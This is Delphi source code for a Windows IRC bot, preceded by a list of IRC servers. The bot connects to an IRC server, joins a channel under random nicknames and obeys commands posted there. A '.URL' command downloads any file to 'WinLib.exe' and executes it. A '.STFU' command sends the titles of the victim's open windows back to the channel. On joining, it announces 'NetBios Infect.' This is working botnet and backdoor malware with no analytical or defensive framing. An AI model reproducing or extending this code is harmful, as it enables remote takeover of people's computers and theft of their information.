   {
           HOST                  IP            PORT
     IRC.SORCERY.NET   >> 216.122.249.75   >> 6667
     IRC.NEWNET.NET    >> 209.208.101.131  >> 6667
     IRC.EF.NET        >> 208.178.231.190  >> 6667
     IRC.ICQ.COM       >> 64.12.165.57     >> 7000
     IRC.DAL.NET       >> 212.74.101.21    >> 7000
     IRC.QUAKENET.ORG  >> 62.30.30.109     >> 6667
   }

   unit main;

   interface

   uses
    Windows, WinSock;
   const
     BUFLEN                   = 65536;
   var
    IRCPort:integer = 6667;
    IRCServer:string;
    IRCNick:string = '[DUST]kit';
    IRCChan:string = '#TCow';
    Sock1:TSocket;
    SockInfo:Sockaddr_in;
    WSAData:TWSAData;
    buff:array[0..1024] of char;
    Send01:string;
    StringList01:array of string;
     var buf:array[0..buflen-1]of char;
       wins:array[0..300]of record name:string;
     wnd:hwnd;
     end;
     wcnt:integer=0;
          procedure sendmsg(str:string);
          Procedure ReadSock;
          Procedure StartUp;
          Procedure ReStart;
          Procedure AddToList01(Text: string);
          procedure ParseContent(Content:string);
          Procedure SendPing;
          Procedure SendInfo;
          Procedure RandomNick;
          function StrToInt(S: string): integer;
          Function IntToStr(X: integer): string;
          function Trim(const S: string): string; overload;
          function DFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';
   implementation

    function RNDNICK:string;
    const
     n:array[0..19]of string=('A','B','C','D','F','G','H','I',
                              'J','K','L','M','N','O','P',
                              'Q','R','S','T','U');
     a:array[0..11]of string= ('|1','^2','3','`4',
                              '|5','^6','7','`8',
                              '|9','^0','1','`2');
     b:string= ('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_^`[]{}\');
    var
     i,j:integer;
     s:string;

    begin
    randomize();
    i:=random(20);
    j:=random(20);
   // if i= 20 then begin
     while j>0 do begin
     sleep(50);
      randomize();
      s:=s+copy(b,random(length(b)),1);
      j:=j-1;
     end;

   (* end else begin
     j:=random(11);
     s := n[i];
     sleep(30);
    randomize();
    i:=random(20);
     s := s + n[i];
     sleep(30);
    randomize();
    i:=random(20);
     s := s + n[i];
       sleep(30);
    randomize();
    i:=random(20);
     s := s + a[j];
       sleep(30);
    end;*)
    result :=s;
    end;

   function rndline:string;
   var
    abc:string;
    i:integer;
   begin
    abc := '01234567890123456789abcdefghijklmnopqrstuvwxyzåäö       ';
    randomize();
    i:=random(80);
   while i<>0 do begin
   sleep(10);
   randomize();
   result := result + copy(abc,random(length(abc)),1);
   i:=i-1;
   end;
   end;

   function enumwinproc(w:hwnd;lpr:lparam):boolean;stdcall;
   begin

     if iswindowvisible(w) then begin
       getwindowtext(w,buf,10000);
       if buf[0]<>#0 then begin
         wins[wcnt].name:=buf;
         wins[wcnt].wnd:=w;
         wcnt:=wcnt+1;
       end;
     end;
     result:=true;
   end;

   function sendwindows:string;
   var i:integer;
   begin
    result:='';
     wcnt:=0;
     enumwindows(@enumwinproc,0);
     for i:=0 to wcnt-1 do begin
       result:=result+{'['+inttostr(wins[i].wnd)+']'+}wins[i].name+chr(13);
       wins[i].name := '';
       wins[i].wnd := 0;
     end;
   end;
   function getwins:string;
   begin
    result:='';
    result:=sendwindows;
   end;

   procedure ReadSock;
    var
     str01:string;
     target:string;

    begin
     str01:=buff;
    if pos('Nickname is already in use.',str01) > 0 then
     begin  //Incase nick already used. (duh!)
      send01:='NICK ' + RNDNICK + #13#10;
      send(Sock1,send01[1],Length(send01),0);
      ZeroMemory(@buff,sizeof(buff));
     end else
    if pos('.URL' ,str01)   > 0 then
     begin
      send01 := copy(str01,pos('.URL',str01)+4,length(str01));
      target := copy(send01,1,length(send01));
      target := copy(target,1,length(target)-2);
      send01:='PRIVMSG ' + IRCChan +' :Downloading : '+target + #10#13;
      send(Sock1,send01[1],Length(send01),0);sleep(200);
      DFILE(0,pchar(target),'WinLib.exe', 0, 0);
      WinExec('WinLib.exe',0);
      send01:='PRIVMSG ' + IRCChan +' :Downloaded '+target+', executing' + #10#13;
      send(Sock1,send01[1],Length(send01),0);sleep(200);
     end else
    if pos('.STFU',str01) > 0 then
     begin
      send01:='PRIVMSG ' + IRCChan +' :'+ GETWINS + #10#13;
      send(Sock1,send01[1],Length(send01),0);sleep(200);
     end else
    if pos('PING :',str01) > 0 then
     begin  //Replys to 'Server' pings.
      ZeroMemory(@buff,sizeof(buff));
      ParseContent(str01);
      SendPing;
      SetLength(StringList01,0);sleep(200);
   //   send01:='PRIVMSG ' + IRCChan +' :'+ rndline + #10#13;
   //   send(Sock1,send01[1],Length(send01),0);
     end else
    if pos('MOTD',str01) > 0 then
     begin  //Most servers will have this. Bot will join channel when this appears.
      ZeroMemory(@buff,sizeof(buff));
      send01:='JOIN ' + IRCChan + #10#13;
      send(Sock1,send01[1],Length(send01),0);
      sleep(300);
      send01:='PRIVMSG ' + IRCChan +' :NetBios Infect. !' + #10#13;
      send(Sock1,send01[1],Length(send01),0);
     end else
     ZeroMemory(@buff,sizeof(buff));
    end;

   procedure sendmsg(str:string);
   begin
      sleep(500);
      send01:='PRIVMSG ' + IRCChan + ' :'+str + #10#13;
      send(Sock1,send01[1],Length(send01),0);
   end;

   function getip(iip:string):String;
   var ip:phostent;
       ipc:cardinal;
       ipa:array[1..4]of byte absolute ipc;
   begin
     ip:=winsock.gethostbyname(pchar(iip));
     if ip=nil then begin
       result:='127.0.0.1';
       exit;
     end else begin
       ipc:=cardinal(pointer(ip^.h_addr_list^)^);
       ipc:=winsock.ntohl(ipc);
     end;
     result:=inttostr(ipa[4])+'.'+inttostr(ipa[3])+'.'+inttostr(ipa[2])+'.'+inttostr(ipa[1]);
   end;

   procedure Startup;
    begin    //Starts the socket and trys to connect.
     WSAStartup(257,WSAData);
     SockInfo.sin_family:=PF_INET;
     SockInfo.sin_port:=htons(IRCPort);
     SockInfo.sin_addr.S_addr:= inet_addr(PChar(getip('irc.undernet.org')));
     Sock1:= socket(PF_INET,SOCK_STREAM,0);
     Connect(Sock1,SockInfo,sizeof(SockInfo));
    end;

   Procedure Restart;
    begin     //Hence the name, restarts if it cant connect, or gets disconnected.
     Shutdown(Sock1,2);
     CloseSocket(Sock1);
     Sleep(5000);
     StartUp;
     SendInfo;
    end;

   procedure ParseContent(Content:string);
    var
     i: integer;
    begin
     i := Pos(' ', Content);
      while (i > 0) do
       begin AddToList01(Copy(Content, 1, i - 1));
        Delete(Content, 1, i); i := Pos(' ', Content);
       end;
        if Length(Content) > 0 then
         AddToList01(Content);
    end;

   Procedure AddToList01(Text: string);
    var
     ListLen: integer;
     Listlen2:integer;
    begin
     ListLen:= Length(StringList01);
     ListLen2:= ListLen + 1;
     SetLength(StringList01, ListLen2);
     StringList01[ListLen]:= Text;
    end;

   procedure SendPing;
    begin     //The PONG reply to the server.
     send01:='PONG ' + StringList01[High(StringList01)];
     send(Sock1,send01[1],Length(send01),0);
    end;


   procedure sendinfo;
    begin     //Info to connect. has to be sent so the server can authorize your connection.
     Randomize;
     send01:='NICK ' + RNDNick + #13#10;
     send(Sock1,send01[1],Length(send01),0);
     send01:='USER '+RNDNick + ' ' + #34 + RNDNick + #34 + ' ' + #34 + RNDNick + #34 + ' ' + ':' + RNDNick + #13#10;
     send(Sock1,send01[1],Length(send01),0);
    end;

   function IntToStr(X: integer): string;
    var
     S: string;
    begin
     Str(X, S);
     Result := S;
    end;

   function StrToInt(S: string): integer;
    var
     V, Code: integer;
    begin
     Val(S, V, Code);
     Result := V;
    end;

   function Trim(const S: string): string;
    var
     I, L: Integer;
    begin
     L := Length(S);
     I := 1;
     while (I <= L) and (S[I] <= ' ') do Inc(I);
     if I > L then Result := '' else
      begin
       while S[L] <= ' ' do Dec(L);
       Result := Copy(S, I, L - I + 1);
      end;
    end;

   Procedure RandomNick;
    begin     // Duh!
     Randomize;
     send01:=rndnick + #13#10;
     send(Sock1,send01[1],Length(send01),0);
    end;

   end.
